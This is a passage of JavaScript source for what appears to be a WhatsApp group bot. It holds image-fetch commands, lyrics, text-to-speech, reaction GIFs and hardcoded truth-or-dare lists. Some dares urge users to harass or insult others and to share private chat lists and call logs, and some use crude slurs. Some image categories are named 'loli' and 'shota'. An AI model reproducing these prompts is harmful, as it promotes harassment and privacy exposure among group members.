'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await DeepakStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
DeepakBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'lyrics': {
if (!text) return replygcdeepak(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
await DeepakStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
replygcdeepak(`
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
}
break
case 'pick': {
            	if (!m.isGroup) return DeepakStickGroup()
            	if (!text) return replygcdeepak(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await DeepakBotInc.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let deepakshimts = member[Math.floor(Math.random() * member.length)]
             DeepakBotInc.sendMessage(from, { 
text: `The most *${text}* here is *@${deepakshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[deepakshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./DeepakMedia/theme/Zenitsupic.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     case 'say': case 'tts': case 'gtts':{
if (!text) return replygcdeepak('Where is the text?')
            let texttts = text
            const deepakrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return DeepakBotInc.sendMessage(m.chat, {
                audio: {
                    url: deepakrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replygcdeepak(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    case 'quotes':
const quotedeepak = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotedeepak.data.quote.body}\n\n*${themeemoji} Author:* ${quotedeepak.data.quote.author}`
return replygcdeepak(textquotes)
break
case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner Deepak  through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const deepakdare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              DeepakBotInc.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ deepakdare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, Deepak?",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const deepaktruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              DeepakBotInc.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ deepaktruth }, {quoted:m})
              break
              case 'hug': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          DeepakBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return DeepakStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcdeepak(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

